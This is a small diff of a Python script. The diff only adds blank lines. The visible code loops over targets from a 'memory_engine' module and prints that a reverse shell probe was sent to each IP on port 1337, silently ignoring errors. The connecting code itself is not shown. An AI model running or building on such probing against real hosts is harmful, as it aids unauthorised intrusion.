@@ -1,5 +1,7 @@
 import socket
+
 from memory_engine import get_top_targets
+
 
 def probe_shell():
     for t in get_top_targets():
@@ -13,6 +15,7 @@ def probe_shell():
             print(f"[+] Reverse shell probe sent to {ip}:1337")
         except:
             pass
+
 
 if __name__ == "__main__":
     probe_shell()
